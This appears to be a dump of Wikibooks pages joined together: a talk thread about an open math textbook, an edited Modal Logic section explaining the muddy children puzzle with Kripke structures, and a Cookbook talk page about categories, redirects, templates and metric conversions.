**** Rather than two why don't you just add some extra chapters that include content that might be covered in other countries. Teacher pick and choose the chapters that they're going to use from textbooks all the time.[[User:Rmawhorter|Rmawhorter]] ([[User talk:Rmawhorter|talk]]) 14:35, 25 January 2008 (UTC)
** Math is the content area in which the curriculum standards (from country to country and within the US, from state to state) vary the least, especially at the lower grade levels. [[User:Kfasimpaur|Kfasimpaur]] 22:03, 16 October 2007 (UTC)
* I've been working on a [[:simple:Numbers|basic math textbook]] over on Simple English Wikibooks. Although the scopes of these books differ, there could be some very useful crossover as far as creating images and activities to enhance the texts --[[User:Ezra Katz|Ezra Katz]] 05:46, 2 December 2007 (UTC)
* I would love to write a textbook coordinating with California standards! I can also coordinate with other standards. [[User:Laleena|Laleena]] ([[User talk:Laleena|talk]]) 14:03, 16 December 2007 (UTC)
* Just to let everyone know. There is a complete online k-12 math curriculum online for free already. It's not open source and it has a different sort of sequence so I'm still in for this project. [[User:Rmawhorter|Rmawhorter]] ([[User talk:Rmawhorter|talk]]) 14:35, 25 January 2008 (UTC)

      <comment>/* Modal Logic */ married(john, mary) is a predicate not a proposition. I changed it to a proposition, right? Although provability is right, I erased it because It can be confusing at this time</comment>
      <text xml:space="preserve">==Modal Logic==
Modal logic is concerned with the investigation of modalities in
logics. Modalities are e.g. ''necessity'', ''possibility''. 
In classical propositional logics, propositions like
&quot;Tom is Married with Mary&quot; may be &lt;math&gt;true&lt;/math&gt; or &lt;math&gt;false&lt;/math&gt;; in real life however, the
truth value of the above propositions obviously can change in time. 
In a different context the truth value may be different in different worlds: 
assume that Tom is dreaming about being married with Mary; 
hence in the world of his dreams the proposition may be true, while in real-life it may be false. 
In still another context, the truth value can depend whether it is considered under legal aspects: 
it is possible that Tom and Mary are legally married, while the catholic church is
considering them to be single.


Modal logics had been studied extensively already during the first half of the
20th century by various logicians. The main breakthrough, however, was the
establishment of a formal semantics of modal logic given be Kripke.

Propositional logics can be extended by modalities  to describe ''belief'',
''knowledge'' or ''temporal aspects''. Hence it is very appropriate to use them
with knowledge representation systems. Recently modal logics have been applied in
verification contexts and as a means to describe the semantics of description
logics.


As an example take the following puzzle:

&lt;blockquote&gt;
Assume 3 children (works for &lt;math&gt;n&lt;/math&gt; children as well), who are perfect reasoners, are
always truthful, and always give an answer, if they know one. The children are
playing outside, and may get muddy foreheads. Any child can see if the other
children have muddy foreheads, but can't see his or her own forehead. At some
point, an adult says to them: at least one of you has mud on your forhead.
The adult now says: Do any of you know if you have mud on your forehead. No one
answers. The adult repeats the question, and again no one answers. The 3rd time
the adult asks the question, one or more of the children answer.
How many of the children have muddy foreheads?
&lt;/blockquote&gt;
This puzzle can be solved by constructing a Kripke structure, which is a set of
states together with links which express the accessbility of states. There are
3 children, each can be muddy or not muddy and, hence, we have &lt;math&gt;2^3&lt;/math&gt; possible
states. States can be represented by triples of booleans values, where a 1 in the nth
position means that the nth child is muddy, and a 0 in the nth position means that the
nth child is not muddy.

The Kripke structure can be defined as follows: consider, e.g. state
(111). Since child 1 does not know whether or not he or she is muddy, as far as
child 1 is concerned, he or she could be in state (011). For child 2 the state
(011), however, is not accessible, since child 2 knows that child 1 is muddy.

A structure which is constructed as depicted above, can be used to solve the
puzzle, by drawing the structure as it results after each speech action of the
adult.

      <text xml:space="preserve">== Merging category/type pages. ==
With the installation of DPLs, I think this is not necessarily a productive thing to do. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 10:53, 27 July 2006 (UTC)

== How to categorize something that is both an ingredient and something to be made ==
Do you categorize a recipe for barbecue sauce in [[:Category:Barbecue sauce recipes]]? If so, where do you categorize recipes which use barbecue sauce as an ingredient? [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 10:53, 27 July 2006 (UTC)

: I don't see any immediate problem with allowing things to be both a recipe and an ingredient. I can think of a million things that require their own recipe, but are usually/often used as a recipe themselves (whipped cream, praline, bechamel sauce). So the main problem (if I'm reading your question correctly) is the ambiguity of the phrase 'Barbecue sauce recipes' as recipes that use the bbq sauce and recipes for bbq sauce. I kinda think we should rename all categories to 'Recipes using X' and 'Recipes for X' (or something similarly unambiguous). It's going to be a lot of work to rename al the existing categories, but we could at least start by making it policy, and work from there.[[User:Risk|risk]] 17:12, 15 October 2006 (UTC)

:: It is, in fact, the strength of the categories, that pages can be included in more than one.
:: Risk's suggestion for the category change is a good one. See [[Wikibooks:Categories]] for a proposal for an official policy/guideline. --[[User:Swift|Swift]] 21:06, 15 October 2006 (UTC)

:: Hrm... I don't like having to write &quot;Recipes including ____&quot; and &quot;Recipes for ____&quot; every time. Maybe the default could be &quot;____ recipes&quot; for pretty much everything, but use the &quot;including ___&quot; and &quot;for ___&quot; when there is something ambiguous. We won't have categories for every possible thing (at least not for many years in which case they can rename all the categories), so maybe that's more workable. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 08:21, 18 October 2006 (UTC)
::: That would make the process of updating the categories a lot easier. It sounds good to me. I suggest we include it in the policy. [[User:Risk|risk]] 15:19, 18 October 2006 (UTC)

== Purge 1881 recipes? ==
Shall we purge 1881/decameron/oscookbook recipes? Many of these are poorly formatted and probably won't be used by the public. Why are we mirroring existing resources? [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 10:53, 27 July 2006 (UTC)
: I suppose the original idea was to have them evolve into original wikicookbook recipes, like the Wikipedia articles that are based on public domain Brittanica articles. I don;t really see that happening. These recipes only have historical interest, as far as I'm concerned, which is what wikisource is for. I agree they should be purged. [[User:Risk|risk]] 17:12, 15 October 2006 (UTC)
:: Where elsewhere do these exist? Unless they are maintained somewhere else in as or better accessible form, I don't see the harm in keeping them. We might still see someone find these an interesting part of Wikibooks to contribute to. --[[User:Swift|Swift]] 21:04, 15 October 2006 (UTC)

::: The [http://www.publicbookshelf.com/public_html/The_Household_Cyclopedia_of_General_Information/ Household cyclopedia], the [http://www.ibiblio.org/oscookbook/ OSCookbook], and the [http://onlinebooks.library.upenn.edu/webbin/gutbook/lookup?num=930 Cook's Decameron] are all available elsewhere. I kind of hate that these recipes are here, as a good number of them are really old and lack proper measurements (you know, fine for looking up, but not that useful to people in this day and age). [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 08:13, 17 October 2006 (UTC)

:::: OK, then let's toss them. --[[User:Swift|Swift]] 20:22, 17 October 2006 (UTC)

::::: That'll be these: [[Special:Whatlinkshere/Template:1881]], [[Special:Whatlinkshere/Template:Decameron]] and [[Special:Whatlinkshere/Template:Oscookbook]]... which looks like a '''lot''' fewer than what I thought was from those sources. I bet there's a bunch not using the templates... [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 20:02, 18 October 2006 (UTC)

:::::: If nothing else they are serving as a starting point for other recipes, i wouldn't bother adding anymore but if any are still about id laeve them, they don't take anything away from the cookbook even if they don't add anything useful

== The purpose of &quot;basic foodstuffs&quot; page and category ==
I don't understand what purpose [[:Category:Basic Foodstuffs]] and [[Cookbook:Basic foodstuffs]] serve. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 10:53, 27 July 2006 (UTC)
: They seem to describe foods or ingredients that are harvested rather than created from other ingredients. A sort of 'atomic' ingredient as far as the cookbook is concerned. I don't see much use for them either, especially since the amount of categories per recipe/ingredient can get out of hand pretty quickly. I think they can be removed. If not, they should at least get a clear definition. [[User:Risk|risk]] 17:12, 15 October 2006 (UTC)

== Tasks that can be done ==
* &lt;s&gt;move the main cookbook page (and subpages) into the cookbook namespace&lt;/s&gt; '''done''' semi-recently by [[User:Gentgeen]] I think. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 20:12, 19 January 2007 (UTC)
* crosslink ingredients with the new gardening book

== Redirects cleanup ==

I made [[Cookbook/Redirects]], which is a listing of all our redirects. We should go through them and clear out the ones that are just trash. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 17:19, 28 July 2006 (UTC)

: Would some other (1 or 2) cookbook editors take a look at this list and write here when they've vetted it? It should be removed after this is done (since it otherwise adds &quot;fake&quot; wanted pages). [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 20:14, 19 January 2007 (UTC)
::I'll take N-Z over the next week or so. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 22:48, 19 January 2007 (UTC)
:Me again. Hot kitchen, hot day, hot oven, so looking at this until I can stop running back and forth to the kitchen. 
:What would you classify as &quot;trash&quot;? I'd say stuff that is obviously debris from page moves, and stuff that has no links and no prospects of links. But then there's stuff that has no links, but has some prospect of links, e.g. alternative names for ingredients; see [[Special:Whatlinkshere/Cookbook:Edible_Cactus]] for some examples. I reckon that this isn't trash, because it is likely to help wikify a new recipe. What are your thoughts? [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 03:13, 20 January 2007 (UTC)

:: We should be trashing redirects that have no prospects of being used, imo. Redirects which someone could feasibly type in to a recipe should stay. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 08:36, 20 January 2007 (UTC)

:::I'll look at some when I have a mo (tho I think we could discuss &quot;feasible&quot; recipes for some time!  I'm not a fan of redlinks - they encourage junk &amp; vandalism quite a bit - cheers --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 08:39, 20 January 2007 (UTC)

:::: When I said &quot;feasible&quot; with respect to our redirects, I meant redirects mostly for ingredients where a user could type in any number of possible spellings, plurals, etc. I think these are valid and useful redirects and should stay. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 16:35, 20 January 2007 (UTC)

Perhaps we should categorize our redirects, since that should also help clear up why each redirect exists. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 16:54, 20 January 2007 (UTC)
:That would help identify redirects created by users who don't know about the categorisation, and page move debris, but ultimately it leaves a lot of redirects. Would there be any need to go further than &quot;Alternative name Cookbook redirects&quot;? 
:As to possible spellings, plurals, etc. I think that can go too far, and end up just encouraging redirection. It also helps persist problematic misspellings like &quot;yucca&quot; instead of &quot;yuca&quot; ([[Cookbook:Cassava|cassava]]) - better to fix such misconceptions than to support them. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 22:40, 20 January 2007 (UTC)

:: I was thinking of [[:Category:Ingredient redirects]] and [[:Category:Recipe redirects]], where the ingredients redirs would be more lax; allowing plurals, alternate spellings, capitalization, whatever, and the recipe ones would be very strict, basically only allowing non-english-language names. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 09:53, 21 January 2007 (UTC)

:::Sounds good; that would allow us to tag the redirects that we want to keep, and thus more easily manage the new ones that build up. Just as long as a good dose of common sense is also applied - i.e. strict isn't ''STRICT'' and lax isn't brain dead ;-) [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 12:05, 21 January 2007 (UTC)

:OK, I've done the page over and submitted lots of speedy deletes (nearly all of which have been actioned, to date). I skipped:
:* alternative ingredient, tool, and technique names that weren't gibberish
:* some alternative recipe names, mainly non-English stuff but also some wronglish
:* some stuff that should be cleaned up, but there's a number of links using the redirect
:* the odd one I wasn't too sure about
:So, please feel free to run through the page yourself, and pick out any I left that you think ought to go. I should mention also that some of these links are now actual pages (not redirects), and that there is a number of redirects not here also (i.e. have cropped up since Kellen made the page). Have at it! [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 13:13, 23 January 2007 (UTC)

I looked over it again and it seemed pretty clean. Thanks everybody for contributing. I've removed the page to eliminate the links showing up on wantedpages. If you want to generate a list of redirects for yourself, you can use the [[User:Kellen/Scripts|script on my user page]].

== Category sort enhancement request ==

I've made an [http://bugzilla.wikimedia.org/show_bug.cgi?id=6387 enhancement request] on the mediawiki bugtracker requesting that categories be able to set the default sort key. This would mean that instead of doing &lt;nowiki&gt;[[Category:Category name|{{PAGENAME}}]]&lt;/nowiki&gt; we would just go to each category and do &lt;nowiki&gt;__SORTBYPAGENAME__&lt;/nowiki&gt; (or something similiar). This would be a huge boon for the cookbook as we have many, many categories and this would mean many, many places where we don't have to sort things by hand. Please go [http://bugzilla.wikimedia.org/show_bug.cgi?id=6387 vote for this bug]. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 17:15, 31 July 2006 (UTC)

:Since MediaWiki v1.10, there is now a magic word '''&lt;nowiki&gt;{{DEFAULTSORT}}&lt;/nowiki&gt;''' that allows you to do this. It only just occurred to me today that this can be stuffed into a template and thus fix any pages in a book that use said template. I've added it into {{tl|Recipe}} and {{tl|Ingredient}}, so it should be picked up on recipe and ingredient pages (including those using templates that include those two, such as {{tl|spice}} and {{tl|fruit}} etc.) I did ''not'' add it to {{tl|cooknav}}, because that template is often used on categories - don't know if it matters, but at the very least it isn't required. If you can think of any other [[:Category:Cookbook templates|Cookbook templates]] that would benefit from this, please amend as necessary.

::Have now also done {{tl|unit}}, {{tl|technique}} and {{tl|equipment}}. A valid reason for not just adding it to {{tl|cooknav}} is that the other templates allow us to specify an alternative default sort, e.g. an ANSI version of a name with non-ANSI characters.

== Cooking Lessons ==

Hello, at present this cookbook is a collection of recipes. But actually Wikibooks are not defined as a collection, but as  learning books. Further recipes collection can be found thousands in the internet. But how to learn cooking for a REAL!! beginner, who never cooked before, you cannot find. No book is available and if you go to a cours &quot;for beginners&quot; i.e. at an adult education centre, it is never for real beginners. This is one reason more, to establish such a book here. The system of a lerning book i.e. French is learning and practising lessons with slightly progressing difficulty. Thus I would suggest to do the same here. Such lessons could be:

*What is the difference cooking / frying / microwaving?
*The first fried egg (How much butter / salt?)
*From a rough piece of goulache to a cooked / fried / microwaved one.
*From a bought potato (how to peel) to a cooked / fried / microwaved one.
*When using a pot and when a pan?
*What can be cooked in the microwave?
*Photos , Videos
*and so on

I would also suggest, to establish recipes which apply to the category microwave.

: I wouldn't say the cookbook is just a collection of recipes. In my opinion it's growing into sort of a general reference on everything to do with cooking. I think all of your questions could be answered by information currently in the cookbook, but I suppose that for someone with no experience whatsoever, those articles would be difficult to find. I think it might be nice to set up cooking 'courses' as gentle introductions to a field of cooking, explaining things along the way and referencing existing recipes and articles along the way. We could do introductions based on skill level (absolute beginner/beginner/intermediate/professional) and based on genre (French/Indian/Vegetarian). We could even have reading and cooking excercises.

== Budget or low cost Diet ==

How about a section of low cost items? Such as for people who are living on a TIGHT budget. You could put in Ramen noodle recipes, ways to spice up mac &amp; cheese, or how to turn a ramen noodle pack into a semi-rice cake type thing, stuff like that.

: Go for it. That's difficult to do well, though. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 20:00, 28 September 2006 (UTC)

== Wikipedia templates ==

The current wikipedia template for linking to the cookbook doesn't work so well (e.g.: &quot;Wikibooks has a recipe for carrot...&quot;, when it should be &quot;recipes using carrots&quot;, etc.), and as I had mentioned to Kellen earlier, I'd like to see something that looks a bit nicer thean the blue-gray link as it currently appears. 

I'd like to propose something more along the lines of the following 3 templates. I think there should be 3 to differentiate between ingredients, single recipes, and groups of recipes. 

{{Cookbook-i-wikipedia|Walnuts|walnuts}}

{{Cookbook-r-wikipedia|Hot and Sour Soup|hot and sour soup}}

{{Cookbook-rs-wikipedia|Hummus|hummus}}

For the image, I think it would be nice to change it every month to use the &quot;featured recipe (I didn't do that for this one because that image does not have a copyright tag, and is not on commons (and I can't load it on commons with no copyright tag provided by the contributor). That's what I'm doing with the link template to [[A Wikimanual of Gardening]]:

{{Wmog-wikipedia|Juglans nigra}}

It might need a better background color, but that can be changed at any time. 

Any thoughts? [[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 10:38, 6 October 2006 (UTC)

: Good start. I think that although we should change up the background color from the gray that it currently is, it should be in keeping with the (very desaturated and pale) color scheme of wiki(books|pedia). I'll try to come up with some color combos that look good. Also I think the wording might be better as &quot;Recipes for Hummus can be found in the Wikibooks Cookbook&quot; (or maybe &quot;The Wikibooks Cookbook has recipes for Hummus&quot; so that the location is specified first). Finally, it would be good if we could come up with some logo ideas so we have a unique identifier. We can actually change the corner logo based on the namespace, so the whole cookbook would be branded differently than main wikibooks.

: Do we really need two templates for plural and singular? I'd think the plural would suffice. Though a little inaccurate, as more recipes are added to the Cookbook these templates would &quot;need&quot; updating. Seems better to simply have one template.
: Sure, a second template for ingredients could be useful. Alternatively, we could have an optional parameter (e.g. &quot;use&quot;) which could be set to &quot;ingredient&quot; or something along those lines. I'm just wondering which would make the overview easier. A fairly simple multiple-template usage-overview solution would be to share usage documentation among the templates. --[[User:Swift|Swift]] 15:36, 9 October 2006 (UTC)

:::I strongly disagree actually: while it's more work to '''set up''' three templates, in the end it means less work as far as keystrokes and inevitable mistakes in the keystrokes. I'd rather just put in ((cookbook-i|ingredient name)) than ((cookbook|variable|variable|variable|variable...)). IOW, it's easier to figure out which of 3 simple templates to use than it is to learn how to use 1 overly complicated template, and they really should be easy to use, rather than &quot;for the experts&quot;. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 17:39, 9 October 2006 (UTC)

:::: Actually, usually it comes out pretty much evenly. Every added variable is an extra little phrase. The &quot;-i&quot; will not need &quot;variable|variable|variable|variable...&quot; (&lt;code&gt;:-D&lt;/code&gt;). I don't like in keystroke number arguments on their own (variable name length is a different, and better, one). The difference between ten characters for a slow typist is no more than ten seconds ... an insignificant time compared to the decision making process of which page to link to/from and where to place the link.
:::: Nor do I think that remembering the difference between variables or template names is of great consequence.
:::: My main concern is in the realm of maintainance and documentation. If a single template can be expanded a little by use of a little more complicated syntax, it will be a one-stop for those seeking information about it. Its documentation will list the available options which will give a nice overview. The alternative is to transclude/include (naming seems to depend on the project) the documentation. Personally, I find functional templates better than multiple ones.
:::: As this is indeed a personal choice and of no critical significance, I've always though it should be up to the people who use these templates the most (e.g. those regularly contributing to the Cookbook should be allowed to organize their material &amp;mdash; though I'm more than willing to share my thoughts and experiences). --[[User:Swift|Swift]] 19:10, 9 October 2006 (UTC)

No to linking in changing images: the template needs to become familiar and instantly recognisable. (Also, how would a pork or seafood related image be received by the world at large?) And it needs to maintain an appropriate family relationship with the rest of the Wiki templates (if it sticks out too much people will remove it from their neatly maintained pages). A Wiki style icon is needed for the cookbook. And absolutely: correct grammar at all times! It's hard enough dealing with human ideas of grammar, but fighting built-in defaults... There's no reason why templates shouldn't come in both multiple and single option variants. [[User:LittlePete|LittlePete]] 03:12, 23 March 2007 (UTC)

== Import enabled! ==

==Import questions==

Some of the cookbook-related stuff in [[w:Category:Copy to Wikibooks]] and [[w:Category:Articles containing how-to sections]] involve recipes or ingredients already discussed in the cookbook, but either have additional material (e.g. [[w:Dal]] vs. [[Cookbook:Dal]]), or have recipes that are different from the ones currently in the cookbook. I'm going to just transwiki these into the Transwiki: namespace (when there's no cookbook article yet, I just import directly into the cookbook), and then move them to the cookbook. What's the naming convention for this? Should they just be merged with the current article, or do two different recipes for the same-named dish get two different pages? --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 14:43, 21 October 2006 (UTC)

: It's a case-by-case basis. If the recipes are suitably similar, pick the best one and just trash the other (yes, it's okay to do that). If one could be incorporated as a variation on the primary recipe, do that in a new section. If the recipes really are substantially different and both are good, you can make a disambiguation page on the generic name for the result of the recipe (e.g. [[Cookbook:Hummus]]) and then put each recipe on a uniquely named page and link them from the disambiguation page. The new recipe pages should be named according to some attribute of the recipe if possible, but failing that you could use roman numerals to distinguish them (e.g. Hummus I and Hummus II) [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 16:05, 21 October 2006 (UTC) 

Also, I remember a discussion several weeks ago about making articles for general cooking techniques.

Looking thro these and ones such as [[Cookbook:Meatloaf]] and variations I was wondering if there was a policy on this.  Could I propose for discussion (if there isn't) that they be incorporated in one page as sub headings showing Method 1, Method 2?  In the case of actual dupes thro capitalisation (Fried Rice &amp; rice for example), the the incorrect one could be a re-direct to prevent it happening again?  Cheers --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 16:47, 23 October 2006 (UTC)

: There's already a policy, which I thought appeared on [[Cookbook:Policy]], but it apparently does not. I shall write it up and direct you to it when I am done. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 09:55, 24 October 2006 (UTC)

: Okay, written up on [[Cookbook:Policy#Duplicate_Recipes_and_Disambiguation_Pages]]. The meatloaf page is following the policy. We decided long ago that it is better to split the pages rather than to have endless &quot;method 1, 2, 3, 4, 5&quot; on a single page.

::: Ah yes, that category was made and populated by me when I have been going through all the recipes and doing basic formatting. It was a note for me (or you, now) to go in and either make disambiguation pages or merge them or whatever.

== Ext links ==

OK - someone won't like this I'm sure but [[Cookbook:Vegan cuisine]] seems to be breeding links - is there a policy on this sort of thing? &lt;small&gt;—The preceding [[w:Wikipedia:Sign your posts on talk pages|unsigned]] comment was added by [[User:Herbythyme|Herbythyme]] ([[User talk:Herbythyme|talk]] • [[Special:Contributions/Herbythyme|contribs]]) {{{2|}}}.&lt;/small&gt;

: No there isn't a strict policy. I've been watching to ensure that the links were at least related to veganism, but haven't taken the time to actually cull the bad ones. On WP there is a similar problem, so we just delete pretty much any added links. They're more appropriate here since some of the links are for recipe sites, etc, but still we don't need all of them.

== Metric Measurements ==

Since 95% of the world use metric measurements (every country except USA, Liberia and Burma) it would be great if WikiBooks pages used both systems.  Most pages I've visited use only imperial US measurements which means nothing to the rest of the world.  I'm prepared to start to update all pages and use both systems but do we have any kind of template message that could be inserted on to the top of each page which isn't metricated so my job would be easier? [[User:Xania|Xania]] 20:41, 23 October 2006 (UTC)
: I was thinking the same thing recently. There's no question in my mind that both systems should be used. The question of course is which measurement should come first. It's not very important either, but I think it should be made policy, so that it's done the same way every page. I also think it would be a good idea to use a simple template like &lt;nowiki&gt;{{unit|1 litre|33.8 floz}}&lt;/nowiki&gt; or something similar for all measurements. That way it would be easier to create some kind of preference for users, so they can see the type of measurements they prefer. We might even be able to do automatic conversion (so you'd only have to say &lt;nowiki&gt;{{metric_unit|1 litre}}&lt;/nowiki&gt; and the wiki software could calculate the rest) if the template system supports that sort of arithmetic easily.
: I don't know if a maintenance template exists for this specific thing, but if not, you could probably create one. It wouldn't be a bad idea to set up some maintenance templates for the cookbook like wikipedia has. [[User:Risk|risk]] 07:49, 24 October 2006 (UTC)

: Virtually every page will have non metric units. Just go through the recipe index alphabetically and you'll hit most pages. A template message would be inappropriate. Tagging with a category ''might'' be okay, but you'd spend a lot of time just categorizing what will be the entire recipe listing. As for which should go first; it makes sense to have the original units first since they are authoritative. And as for having wiki software convert the units.... good luck. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 09:51, 24 October 2006 (UTC)

::Adding the category to the template would make things easier to find. You might need to find information on densities for some stuff though, i.e. from teaspoon to gram, ounce to ml. 
::A lot of the stuff I've been importing are Indian recipes, which are metric, and so need converting in the other direction as well.--[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 09:58, 24 October 2006 (UTC)

::: I'm saying that it's not hard &quot;find&quot; these things. You go to any cookbook page, you'll get imperial units. You'd literally have to tag a few thousand recipes with &quot;Hey this page uses imperial units&quot;, and have maybe 100 with metric units. It's silly to do it that way. A better way would be to tag the recipes you ''have'' converted and then use DPLs to generate a list of &quot;things in category:recipes that are not in category:has_metric_units&quot; or whatever. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 10:27, 24 October 2006 (UTC)

:::: That may be true now, but what we're working towards is a cookbook where the pages without double measurements are in the minority, and then tagging the wrong ones would make sense. Even if it isn't much use now, I think it's a lot nicer to tag the pages that need correction instead of tagging ones that are good. I agree that tagging all pages with a maintenance tag is silly, but we could just hold off on tagging until it makes sense. And converting units with the wiki software won't work with the current implementation, but if the template syntax is improved, it would be nice to have all the measurements wrapped in templates. [[User:Risk|risk]] 14:41, 24 October 2006 (UTC)

::::: Your logic isn't wrong (it does theoretically make more sense to tag the incorrect things), but if this is going to be a major project for people, it makes sense to spend your time effectively (i.e. not doing lots of useless prep work). Try using DynamicPageLists and tagging the articles you have completed. In the end, you may do the same amount of work in adding the categories, but you'll do this work in conjunction with the (more labour intensive) conversions and you'll have fewer edits to do overall so you'll save time. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 17:21, 24 October 2006 (UTC)
::::: Here's how you would accomplish this, using DPLs and a theoretical category [[:Category:Recipes with metric units]]:
::::: &lt;nowiki&gt;&lt;DynamicPageList&gt;&lt;/nowiki&gt;&lt;br/&gt;category=Recipes&lt;br/&gt;notcategory=Recipes with metric units&lt;br/&gt;namespace=102&lt;br/&gt;shownamespace=false&lt;br/&gt;order=descending&lt;br/&gt;&lt;nowiki&gt;&lt;/DynamicPageList&gt;&lt;/nowiki&gt;
::::: Hope this helps. When you make this listing, you should try not to refresh it every time since it's quite a big database hit. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 17:26, 24 October 2006 (UTC)

::::::: By default you get results from all namespaces (including categories). I've updated my previous comment to specify the Cookbook namespace, which should fix the problem. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 20:14, 24 October 2006 (UTC)

:::::::: I don't even know what dynamic page lists are - is there anywhere on Wiki which can help me with this?  For now I'll continue to convert measurements and round up/down as appropriate (e.g. 1 ounce is 28g but nobody would ever be that precise so it'd be best to say 30g). [[User:Xania|Xania]] 19:48, 25 October 2006 (UTC)
::::::::: You can take a look at [[meta:DynamicPageList]] if you want more info, but you should be able to just copy and paste the code I wrote above into a page, say [[User:Xania/Sandbox]] and get a useful listing of recipes. If you then add each recipe you convert to [[:Category:Recipes with metric units]], the listing will update to no longer show the recipes in that category. You will then have a listing of all non-metric recipes without the added work of tagging every single recipe as needing metric units. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 20:18, 25 October 2006 (UTC)
:::::::::: Thanks a lot.  I've now set up both pages (the page for metricated recipes and the page in my sandbox for those needing metrication).  I guess each time I update a recipe I'll need to manually edit the page for metricated recipes so it's removed from the unmetricated list - or is there any easier way?  It's important that Wikibooks appeals to people from all around the world because most recipes at present mean nothing to non-Americans and they;re impossible to understand.  I still fail to see how you can use cups as a basis for measuring weight! [[User:Xania|Xania]] 22:47, 27 October 2006 (UTC)

::::::::::: I'm not ''quite'' sure what you mean by ''&quot;I guess each time I update a recipe I'll need to manually edit the page for metricated recipes so it's removed &quot;''. When you convert a recipe, add it to [[:Category:Recipes with metric units]] and it should automatically disappear from your Sandbox page list (if you've used the same DPL code I pasted above). [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 15:52, 28 October 2006 (UTC)

:::::::::::: Oh, I see. You've created a flat, hand-maintained list on [[:Category:Recipes with metric units]]. Don't do this. Instead, on each page with metric units, put &lt;nowiki&gt;[[Category:Recipes with metric units]]&lt;/nowiki&gt;. The category will be updated and so will the list on your Sandbox page. Yeah and we don't really measure weight most of the time, we use a the volume as roughtly equivalent. Not good for bread, but fine for pretty much everything else. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 15:58, 28 October 2006 (UTC)

